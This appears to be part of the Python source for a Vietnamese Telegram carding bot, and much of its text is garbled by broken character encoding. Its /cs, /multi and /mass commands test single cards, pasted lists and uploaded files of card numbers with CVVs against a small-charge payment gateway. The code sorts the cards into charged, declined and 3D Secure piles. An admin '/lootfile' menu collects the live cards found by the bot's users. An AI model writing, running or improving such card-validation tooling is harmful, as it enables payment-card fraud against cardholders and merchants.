        )

        final_message = f"‚ÑπÔ∏è **BIN Info:** `{bin_to_check}`\n\n{response_text}"
        await msg.edit_text(final_message)

    except json.JSONDecodeError:
        await msg.edit_text(f"‚ùå L·ªói khi ph√¢n t√≠ch d·ªØ li·ªáu t·ª´ API cho BIN `{bin_to_check}`.")
    except Exception as e:
        logger.error(f"L·ªói trong /bin: {e}", exc_info=True)
        await msg.edit_text(f"‚õîÔ∏è **L·ªói H·ªá Th·ªëng:** `{e}`")


async def cs_command(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return

    if not context.args: await update.message.reply_text("S·ª≠ d·ª•ng: `/cs cc|mm|yy|cvv` ho·∫∑c `/cs cc|mm/yy|cvv`"); return
    
    line = " ".join(context.args)
    msg = await update.message.reply_text("‚è≥ *Checking your card, please wait...*")
    start_time = time.time()
    try:
        status, original_line, full_response, bin_info = await asyncio.to_thread(check_card, line)
        duration = time.time() - start_time

        is_vn_decline = status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE'

        if is_vn_decline:
            final_message = (f"**üí† CARD CHECK RESULT üí†**\n\n"
                             f"**üí≥ Card:** `{original_line}`\n"
                             f"**üö¶ Status: ‚ùå DECLINED**\n"
                             f"**üí¨ Response:** `DECLINED`\n\n"
                             f"**üè¶ Gateway:** `Charge 0.5$ Auth Api`\n\n"
                             f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker by: {ADMIN_USERNAME}*")
        else:
            status_map = {
                'success': ("‚úÖ CHARGED 0.5$", "Transaction successful!"),
                'decline': ("‚ùå DECLINED", "Transaction declined by issuing bank."),
                'custom': ("üîí 3D SECURE", "3D Secure authentication required."),
                'invalid_format': ("üìã FORMAT ERROR", full_response),
                'error': ("‚ùóÔ∏è ERROR", full_response),
                'unknown': ("‚ùî UNKNOWN", "Could not determine card status."),
            }
            status_text, response_message = status_map.get(status, status_map['unknown'])
            
            # *** FIX L·ªñI NONETYPE ***
            brand = (bin_info.get('brand') or 'N/A').upper()
            card_type = (bin_info.get('type') or 'N/A').upper()
            level = (bin_info.get('level') or 'N/A').upper()
            bank = bin_info.get('bank') or 'None'
            country_name = (bin_info.get('country_name') or 'N/A').upper()
            country_code = bin_info.get('country_code')
            flag = get_flag_emoji(country_code)
            
            bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
            bin_info_line = " ‚Äì ".join(bin_info_parts)

            bin_details_str = (
                f"üÜî **BIN:** {bin_info_line}\n"
                f"üèõÔ∏è **Bank:** {bank}\n"
                f"üåê **Country:** {country_name} {flag}"
            )
            
            # *** FIX L·ªñI PARSE ENTITIES ***
            # S·ª≠ d·ª•ng kh·ªëi code (```) cho c√°c ph·∫£n h·ªìi c√≥ th·ªÉ g√¢y l·ªói Markdown
            response_display_part = ""
            if status in ['invalid_format', 'error', 'unknown']:
                safe_response = str(response_message)[:1000] # C·∫Øt b·ªõt tin nh·∫Øn l·ªói qu√° d√†i
                response_display_part = f"**üí¨ Response:**\n```\n{safe_response}\n```"
            else:
                response_display_part = f"**üí¨ Response:** `{response_message}`"


            final_message = (f"**üí† CARD CHECK RESULT üí†**\n\n"
                             f"**üí≥ Card:** `{original_line}`\n"
                             f"**üö¶ Status: {status_text}**\n"
                             f"{response_display_part}\n\n"
                             f"‚ÑπÔ∏è **BIN Info:**\n{bin_details_str}\n\n"
                             f"**üè¶ Gateway:** `Charge 0.5$ Auth Api`\n\n"
                             f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker by: {ADMIN_USERNAME}*")
        
        await msg.edit_text(final_message)
        
    except Exception as e:
        logger.error(f"L·ªói trong /cs: {e}", exc_info=True)
        # B·ªçc l·ªói trong kh·ªëi code ƒë·ªÉ tr√°nh l·ªói parse entities th·ª© c·∫•p
        safe_error_message = str(e).replace('`', "'")
        await msg.edit_text(f"‚õîÔ∏è **System Error:**\n```\n{safe_error_message}\n```")


async def multi_check_command(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
        
    if user.id != ADMIN_ID and user.id in ACTIVE_CHECKS:
        await update.message.reply_text("B·∫°n ƒëang c√≥ m·ªôt t√°c v·ª• check kh√°c ƒëang ch·∫°y. Vui l√≤ng ch·ªù n√≥ ho√†n th√†nh.", quote=True)
        return

    text_content = update.message.text.split('/multi', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/multi` v√† d√°n danh s√°ch th·∫ª c·ªßa b·∫°n ·ªü d√≤ng d∆∞·ªõi."); return

    lines = [line.strip() for line in text_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if total_lines == 0:
        await update.message.reply_text("Kh√¥ng c√≥ th·∫ª n√†o ƒë·ªÉ check."); return

    if user.id != ADMIN_ID:
        user_limit = get_user_multi_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"‚õîÔ∏è **V∆∞·ª£t qu√° gi·ªõi h·∫°n!**\n\n"
                f"B·∫°n ƒë√£ g·ª≠i `{total_lines}` th·∫ª, nh∆∞ng gi·ªõi h·∫°n cho l·ªánh /multi l√† `{user_limit}` th·∫ª m·ªói l·∫ßn.\n\n"
                f"ƒê·ªÉ tƒÉng h·∫°n m·ª©c, vui l√≤ng li√™n h·ªá admin {ADMIN_USERNAME}."
            )
            return

    status_message = await update.message.reply_text(f"‚è≥ ƒêang kh·ªüi t·∫°o... Chu·∫©n b·ªã check `{total_lines}` th·∫ª.")
    start_time = time.time()
    
    try:
        if user.id != ADMIN_ID:
            ACTIVE_CHECKS.add(user.id)

        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0}
        results = {k: [] for k in counts.keys()}
        processed_count = 0
        last_update_time = time.time()
        num_threads = min(10, total_lines) 

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line): line for line in lines}
            for future in as_completed(future_to_line):
                processed_count += 1
                try:
                    status, original_line, full_response, bin_info = future.result()
                    
                    counts[status] = counts.get(status, 0) + 1
                    
                    status_icons = {'success': '‚úÖ', 'decline': '‚ùå', 'custom': 'üîí', 'invalid_format': 'üìã', 'error': '‚ùóÔ∏è', 'unknown': '‚ùî'}
                    
                    if status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE':
                        result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED`"
                    elif status == 'invalid_format':
                        result_line = f"{status_icons[status]} `{original_line}` | L√Ω do: {str(full_response)[:50]}" # Truncate to prevent errors
                    else:
                        # Handle potential None values from bin_info
                        bank_str = bin_info.get('bank') or 'N/A'
                        type_str = bin_info.get('type') or 'N/A'
                        brand_str = bin_info.get('brand') or 'N/A'
                        country_str = bin_info.get('country_name') or 'N/A'
                        bin_str = f"{bank_str} - {type_str} - {brand_str} - {country_str}"
                        result_line = f"{status_icons.get(status, '‚ùî')} `{original_line}` | `{bin_str}`"

                    results[status].append(result_line)
                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"L·ªói khi x·ª≠ l√Ω future cho th·∫ª {original_line}: {e}", exc_info=True)
                    counts['error'] += 1
                    results['error'].append(f"‚ùóÔ∏è `{original_line}` | L·ªói x·ª≠ l√Ω: {e}")


                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    status_text = (
                        f"**üöÄ Checking in progress...**\n{progress_bar}\n"
                        f"**Progress:** `{processed_count}/{total_lines}`\n\n"
                        f"‚úÖ **Charged:** `{counts['success']}` | ‚ùå **Declined:** `{counts['decline']}`\n"
                        f"üîí **3D Secure:** `{counts['custom']}` | ‚ùî **Errors:** `{counts['error']}`"
                    )
                    try:
                        await status_message.edit_text(text=status_text)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e):
                            logger.warning(f"L·ªói khi c·∫≠p nh·∫≠t ti·∫øn tr√¨nh /multi: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh khi c·∫≠p nh·∫≠t ti·∫øn tr√¨nh /multi: {e}")
                    last_update_time = time.time()
        
        duration = time.time() - start_time
        update_user_stats(user.id, user, counts)

        final_message = [
            f"**üìä Check Complete!**\n",
            f"‚úÖ **Charged:** `{counts['success']}`",
            f"‚ùå **Declined:** `{counts['decline']}`",
            f"üîí **3D Secure:** `{counts['custom']}`",
            f"üìã **Invalid Format:** `{counts['invalid_format']}`",
            f"‚ùóÔ∏è **Errors:** `{counts['error']}`",
            f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n"
            f"-----------------------------------------"
        ]

        if results['success']: final_message.extend(("\n**‚úÖ CHARGED CARDS:**", *results['success']))
        if results['custom']: final_message.extend(("\n**üîí 3D SECURE CARDS:**", *results['custom']))
        if results['decline']: final_message.extend(("\n**‚ùå DECLINED CARDS:**", *results['decline']))
        if results['invalid_format']: final_message.extend(("\n**üìã INVALID FORMAT:**", *results['invalid_format']))
        if results['error']: final_message.extend(("\n**‚ùóÔ∏è ERRORS:**", *results['error']))

        final_text = "\n".join(final_message)
        
        if len(final_text) > 4096:
            await status_message.edit_text("K·∫øt qu·∫£ qu√° d√†i ƒë·ªÉ hi·ªÉn th·ªã. S·∫Ω ƒë∆∞·ª£c g·ª≠i d∆∞·ªõi d·∫°ng file.")
            with io.BytesIO(final_text.encode('utf-8')) as file_to_send:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=file_to_send, filename="multi_check_results.txt")
        else:
            await status_message.edit_text(final_text)

    except Exception as e:
        logger.error(f"L·ªói trong /multi: {e}", exc_info=True)
        safe_error_message = str(e).replace('`', "'")
        await status_message.edit_text(f"‚õîÔ∏è **L·ªói nghi√™m tr·ªçng!**\n```\n{safe_error_message}\n```")
    finally:
        if user.id != ADMIN_ID:
            ACTIVE_CHECKS.discard(user.id)

async def mass_check_handler(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
    
    if user.id != ADMIN_ID and user.id in ACTIVE_CHECKS:
        logger.warning(f"User {user.id} ({user.full_name}) tried to spam /mass.")
        return 

    if not update.message.document: await update.message.reply_text("Please attach a .txt file."); return
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Only .txt files are accepted."); return
    
    file = await context.bot.get_file(document.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    lines = [line for line in file_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if not lines: await update.message.reply_text("üìÇ The file is empty."); return
    
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"‚õîÔ∏è **V∆∞·ª£t qu√° gi·ªõi h·∫°n!**\n\n"
                f"T·ªáp c·ªßa b·∫°n c√≥ `{total_lines}` d√≤ng, nh∆∞ng gi·ªõi h·∫°n c·ªßa b·∫°n l√† `{user_limit}` d√≤ng.\n\n"
                f"Vui l√≤ng li√™n h·ªá admin {ADMIN_USERNAME} ƒë·ªÉ tƒÉng h·∫°n m·ª©c."
            )
            return

    caption = update.message.caption or "/mass"
    
    requested_threads_match = re.match(r'/mass(\d+)', caption)
    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match and requested_threads_match.group(1) else 10

    if user.id != ADMIN_ID:
        num_threads = min(requested_threads, MEMBER_THREAD_LIMIT)
        if requested_threads > MEMBER_THREAD_LIMIT:
            await update.message.reply_text(
                f"‚ö†Ô∏è **Gi·ªõi h·∫°n lu·ªìng!** Th√†nh vi√™n ch·ªâ ƒë∆∞·ª£c d√πng t·ªëi ƒëa {MEMBER_THREAD_LIMIT} lu·ªìng. ƒê√£ t·ª± ƒë·ªông ƒëi·ªÅu ch·ªânh.",
                quote=True
            )
    else:
        num_threads = min(requested_threads, 50)

    num_threads = max(1, num_threads)

    session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
    session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
    os.makedirs(session_dir, exist_ok=True)
    
    status_message = await update.message.reply_text(f"‚è≥ Kh·ªüi t·∫°o... Chu·∫©n b·ªã check `{total_lines}` th·∫ª v·ªõi `{num_threads}` lu·ªìng.")
    start_time = time.time()
    
    try:
        if user.id != ADMIN_ID:
            ACTIVE_CHECKS.add(user.id)

        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0}
        result_lists = {k: [] for k in counts.keys()}
        result_lists['error_debug'] = []
        processed_count = 0
        last_update_time = time.time()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line): line for line in lines}
            for future in as_completed(future_to_line):
                processed_count += 1
                try:
                    status, original_line, full_response, bin_info = future.result()
                    
                    counts[status] = counts.get(status, 0) + 1
                    
                    if status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE':
                        line_to_save = f"{original_line} | DECLINED"
                    elif status == 'invalid_format':
                        line_to_save = f"{original_line} | Reason: {full_response}"
                    else:
                        bank_str = bin_info.get('bank') or 'N/A'
                        type_str = bin_info.get('type') or 'N/A'
                        brand_str = bin_info.get('brand') or 'N/A'
                        country_str = bin_info.get('country_name') or 'N/A'
                        bin_str = f"| {bank_str} - {type_str} - {brand_str} - {country_str}"
                        line_to_save = f"{original_line} {bin_str}"
                    
                    result_lists[status].append(line_to_save)

                    if status in ['error', 'unknown']:
                        debug_info = f"Card: {original_line}\nResponse: {str(full_response)[:3500]}"
                        result_lists['error_debug'].append(debug_info)
                        if user.id != ADMIN_ID:
                            await context.bot.send_message(chat_id=ADMIN_ID, text=f"üêû DEBUG ALERT (user {user.id}):\n{debug_info}")
                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"L·ªói khi x·ª≠ l√Ω future cho th·∫ª {original_line} trong /mass: {e}", exc_info=True)
                    counts['error'] += 1
                    result_lists['error'].append(f"{original_line} | L·ªói x·ª≠ l√Ω: {e}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    status_text = (f"**üöÄ Checking in progress...**\n{progress_bar}\n"
                                   f"**Progress:** `{processed_count}/{total_lines}` | **Threads:** `{num_threads}`\n\n"
                                   f"‚úÖ **Charged:** `{counts['success']}`\n"
                                   f"‚ùå **Declined:** `{counts['decline']}`\n"
                                   f"üîí **3D Secure:** `{counts['custom']}`\n"
                                   f"üìã **Invalid Format:** `{counts['invalid_format']}`\n"
                                   f"‚ùî **Errors:** `{counts['error']}`")
                    try: 
                        await status_message.edit_text(text=status_text)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e):
                            logger.warning(f"L·ªói khi c·∫≠p nh·∫≠t ti·∫øn tr√¨nh /mass: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh khi c·∫≠p nh·∫≠t ti·∫øn tr√¨nh /mass: {e}")
                    last_update_time = time.time()
        
        duration = time.time() - start_time
        final_summary_text = (
            f"**üìä Check Complete!**\n\n"
            f"**Total:** `{total_lines}` | **Threads:** `{num_threads}`\n\n"
            f"‚úÖ **Charged:** `{counts['success']}`\n"
            f"‚ùå **Declined:** `{counts['decline']}`\n"
            f"üîí **3D Secure:** `{counts['custom']}`\n"
            f"üìã **Invalid Format:** `{counts['invalid_format']}`\n"
            f"‚ùî **Errors:** `{counts['error']}`\n\n"
            f"**‚è±Ô∏è Took:** `{duration:.2f}s`"
        )
        
        await status_message.edit_text(final_summary_text)

        summary_data = {'counts': counts, 'original_filename': document.file_name}
        save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
        
        update_user_stats(user.id, user, counts)

        file_map = {
            'success': 'charged.txt', 'decline': 'declined.txt',
            'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt',
            'error': 'errors.txt', 'unknown': 'unknown.txt'
        }
        for status, filename in file_map.items():
            if result_lists[status]:
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("\n".join(result_lists[status]))
                with open(file_path, 'rb') as doc:
                    await context.bot.send_document(chat_id=update.effective_chat.id, document=doc)

        if user.id == ADMIN_ID and result_lists['error_debug']:
            debug_path = os.path.join(session_dir, "debug_admin.txt")
            with open(debug_path, 'w', encoding='utf-8') as f:
                f.write("\n\n---\n\n".join(result_lists['error_debug']))
            with open(debug_path, 'rb') as doc:
                await context.bot.send_document(chat_id=ADMIN_ID, document=doc)

    except Exception as e:
        logger.error(f"L·ªói trong mass_check: {e}", exc_info=True)
        safe_error_message = str(e).replace('`', "'")
        await status_message.edit_text(f"‚õîÔ∏è **L·ªói nghi√™m tr·ªçng!**\n```\n{safe_error_message}\n```")
    finally:
        if user.id != ADMIN_ID:
            ACTIVE_CHECKS.discard(user.id)

# --- C√ÅC L·ªÜNH QU·∫¢N L√ù & TH√îNG B√ÅO ---
async def turn_bot_off(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not is_bot_on():
        await update.message.reply_text("‚ÑπÔ∏è Bot ƒë√£ ·ªü tr·∫°ng th√°i **T·∫Øt** r·ªìi.")
        return

    set_bot_status(False)
    await update.message.reply_text("‚úÖ ƒê√£ **T·∫ÆT** bot. B·∫Øt ƒë·∫ßu g·ª≠i th√¥ng b√°o...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        lang = get_user_lang(user_id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Kh√¥ng th·ªÉ g·ª≠i th√¥ng b√°o t·∫Øt bot cho user {user_id}: {e}")
        await asyncio.sleep(0.1) 
    
    await update.message.reply_text(f"üì¢ Th√¥ng b√°o b·∫£o tr√¨ ƒë√£ ƒë∆∞·ª£c g·ª≠i.\n- Th√†nh c√¥ng: {success_count}\n- Th·∫•t b·∫°i: {fail_count}")

async def turn_bot_on(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if is_bot_on():
        await update.message.reply_text("‚ÑπÔ∏è Bot ƒë√£ ·ªü tr·∫°ng th√°i **B·∫≠t** r·ªìi.")
        return
    
    set_bot_status(True)
    await update.message.reply_text("‚úÖ ƒê√£ **B·∫¨T** bot. B·∫Øt ƒë·∫ßu g·ª≠i th√¥ng b√°o...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        lang = get_user_lang(user_id) or 'en'
        message = MESSAGES_VI["bot_on"] if lang == 'vi' else MESSAGES_EN["bot_on"]
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Kh√¥ng th·ªÉ g·ª≠i th√¥ng b√°o b·∫≠t bot cho user {user_id}: {e}")
        await asyncio.sleep(0.1)

    await update.message.reply_text(f"üì¢ Th√¥ng b√°o ho·∫°t ƒë·ªông ƒë√£ ƒë∆∞·ª£c g·ª≠i.\n- Th√†nh c√¥ng: {success_count}\n- Th·∫•t b·∫°i: {fail_count}")

async def send_message_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if len(context.args) < 2:
        await update.message.reply_text("C√∫ ph√°p: `/send <user_id> <tin_nh·∫Øn>`"); return
        
    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("‚ùå User ID kh√¥ng h·ª£p l·ªá."); return
        
    message_to_send = " ".join(context.args[1:])
    
    try:
        await context.bot.send_message(chat_id=target_user_id, text=f"‚úâÔ∏è **Tin nh·∫Øn t·ª´ Admin:**\n\n{message_to_send}")
        await update.message.reply_text(f"‚úÖ Tin nh·∫Øn ƒë√£ ƒë∆∞·ª£c g·ª≠i ƒë·∫øn user `{target_user_id}`.")
    except Exception as e:
        await update.message.reply_text(f"‚ùå G·ª≠i tin nh·∫Øn th·∫•t b·∫°i: `{e}`")

async def send_all_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        await update.message.reply_text("C√∫ ph√°p: `/sendall <tin_nh·∫Øn>`"); return
        
    message_to_send = " ".join(context.args)
    authorized_users = load_users()
    
    if not authorized_users:
        await update.message.reply_text("‚ÑπÔ∏è Kh√¥ng c√≥ th√†nh vi√™n n√†o ƒë·ªÉ g·ª≠i tin."); return
        
    await update.message.reply_text(f"üì¢ B·∫Øt ƒë·∫ßu g·ª≠i tin nh·∫Øn ƒë·∫øn `{len(authorized_users)}` th√†nh vi√™n...")
    
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=f"üì¢ **Th√¥ng b√°o t·ª´ Admin:**\n\n{message_to_send}")
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Kh√¥ng th·ªÉ g·ª≠i broadcast ƒë·∫øn user {user_id}: {e}")
        await asyncio.sleep(0.1)
        
    await update.message.reply_text(f"üèÅ G·ª≠i tin nh·∫Øn ho√†n t·∫•t!\n- Th√†nh c√¥ng: `{success_count}`\n- Th·∫•t b·∫°i: `{fail_count}`")

async def show_check_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE)
    if not stats:
        await update.message.reply_text("Ch∆∞a c√≥ d·ªØ li·ªáu th·ªëng k√™ n√†o."); return
    
    message = "üìä **TH·ªêNG K√ä CHECK C·ª¶A USER** üìä\n\n"
    
    all_users_to_show = load_users()
    all_users_to_show.add(ADMIN_ID)

    for user_id in sorted(list(all_users_to_show)):
        user_id_str = str(user_id)
        data = stats.get(user_id_str)

        if isinstance(data, dict):
            user_display = f"@{data.get('username')}" if data.get('username') else f"ID: {user_id_str}"
            message += (f"üë§ **{user_display}** (`{user_id_str}`)\n"
                        f"  ‚úÖ Charged: `{data.get('total_charged', 0)}`\n"
                        f"  üîí Custom: `{data.get('total_custom', 0)}`\n"
                        f"  ‚ùå Declined: `{data.get('total_decline', 0)}`\n"
                        f"  ‚ùî L·ªói: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                        f"  üïí L·∫ßn cu·ªëi: `{data.get('last_check_timestamp', 'Ch∆∞a check')}`\n"
                        f"--------------------\n")
        else:
            message += (f"üë§ **ID: {user_id_str}**\n"
                        f"  *Ch∆∞a t·ª´ng check ho·∫∑c d·ªØ li·ªáu l·ªói.*\n"
                        f"--------------------\n")
    
    if len(message) > 4096:
        with io.BytesIO(message.encode('utf-8')) as doc:
            await update.message.reply_document(document=doc, filename="stats.txt")
    else:
        await update.message.reply_text(message)

async def loot_file_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("C√∫ ph√°p: `/lootfile <user_id>`"); return
    
    target_user_id = context.args[0]
    user_log_dir = os.path.join(LOG_DIR, target_user_id)
    
    if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
        await update.message.reply_text(f"Kh√¥ng t√¨m th·∫•y l·ªãch s·ª≠ check cho user `{target_user_id}`."); return
        
    keyboard = [
        [InlineKeyboardButton("1. L·∫•y File Charge G·∫ßn Nh·∫•t", callback_data=f"loot_latestcharge_{target_user_id}")],
        [InlineKeyboardButton("2. L·∫•y T·∫•t C·∫£ File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
        [InlineKeyboardButton("3. Ch·ªçn T·ª´ L·ªãch S·ª≠", callback_data=f"loot_history_{target_user_id}")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Ch·ªçn t√πy ch·ªçn ƒë·ªÉ l·∫•y file c·ªßa user `{target_user_id}`:", reply_markup=reply_markup)

async def button_handler(update, context):
    query = update.callback_query
    await query.answer()
    
    user_from_callback = query.from_user
    data = query.data.split('_')
    command = data[0]
    
    if command == "setlang":
        lang_code = data[1]
        set_user_lang(user_from_callback.id, lang_code)
        
        # Truy·ªÅn ƒë·ªëi t∆∞·ª£ng `user` v√†o h√†m
        help_text = await get_help_text(user_from_callback, lang_code)
        await query.edit_message_text(help_text, disable_web_page_preview=True)
        return

    if user_from_callback.id != ADMIN_ID:
        await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán h√†nh ƒë·ªông n√†y.", show_alert=True)
        return
        
    action = data[1]
    target_user_id = data[2] if len(data) > 2 else None

    if command == "loot":
        if action == "mainmenu":
            keyboard = [
                [InlineKeyboardButton("1. L·∫•y File Charge G·∫ßn Nh·∫•t", callback_data=f"loot_latestcharge_{target_user_id}")],
                [InlineKeyboardButton("2. L·∫•y T·∫•t C·∫£ File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
                [InlineKeyboardButton("3. Ch·ªçn T·ª´ L·ªãch S·ª≠", callback_data=f"loot_history_{target_user_id}")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Ch·ªçn t√πy ch·ªçn ƒë·ªÉ l·∫•y file c·ªßa user `{target_user_id}`:", reply_markup=reply_markup)

        elif action == "latestcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
                await query.edit_message_text(f"Kh√¥ng c√≥ l·ªãch s·ª≠ check cho user `{target_user_id}`."); return
            
            latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
            file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
            
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc:
                    await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.edit_message_text(f"‚úÖ ƒê√£ g·ª≠i file charge g·∫ßn nh·∫•t t·ª´ session `{latest_session}`.")
            else:
                await query.edit_message_text(f"‚ÑπÔ∏è L·∫ßn check g·∫ßn nh·∫•t (`{latest_session}`) kh√¥ng c√≥ th·∫ª charge n√†o.")

        elif action == "allcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            all_charged_content = []
            if os.path.exists(user_log_dir):
                sessions = sorted(os.listdir(user_log_dir))
                for session_ts in sessions:
                    file_path = os.path.join(user_log_dir, session_ts, "charged.txt")
                    if os.path.exists(file_path):
                        with open(file_path, 'r', encoding='utf-8') as f:
                            all_charged_content.append(f.read())
            
            if all_charged_content:
                combined_content = "\n".join(all_charged_content)
                with io.BytesIO(combined_content.encode('utf-8')) as file_to_send:
                    filename = f"all_charged_{target_user_id}.txt"
                    await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=filename)
                await query.edit_message_text(f"‚úÖ ƒê√£ g·ª≠i file t·ªïng h·ª£p t·∫•t c·∫£ th·∫ª charge c·ªßa user `{target_user_id}`.")
            else:
                await query.edit_message_text(f"‚ÑπÔ∏è User `{target_user_id}` kh√¥ng c√≥ th·∫ª charge n√†o trong l·ªãch s·ª≠.")

        elif action == "history":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
            keyboard = []
            for session_ts in sessions:
                summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
                if os.path.exists(summary_path):
                    summary = load_json_file(summary_path)
                    counts = summary.get('counts', {})
                    try: 
                        dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S")
                        readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
                    except ValueError: 
                        readable_ts = session_ts
                    button_text = f"üïí {readable_ts} - ‚úÖ{counts.get('success',0)} ‚ùå{counts.get('decline',0)}"
                    keyboard.append([InlineKeyboardButton(button_text, callback_data=f"loot_session_{target_user_id}_{session_ts}")])
            
            keyboard.append([InlineKeyboardButton("¬´ Quay l·∫°i Menu Ch√≠nh", callback_data=f"loot_mainmenu_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"üìú **L·ªãch s·ª≠ check c·ªßa user `{target_user_id}`:**", reply_markup=reply_markup)

        elif action == "session":
            _, _, target_user_id, session_ts = data
            session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
            files = [f for f in os.listdir(session_dir) if f.endswith('.txt')] if os.path.exists(session_dir) else []
            if not files:
                await query.edit_message_text("Session n√†y kh√¥ng c√≥ file k·∫øt qu·∫£ n√†o."); return
            keyboard = []
            for filename in files:
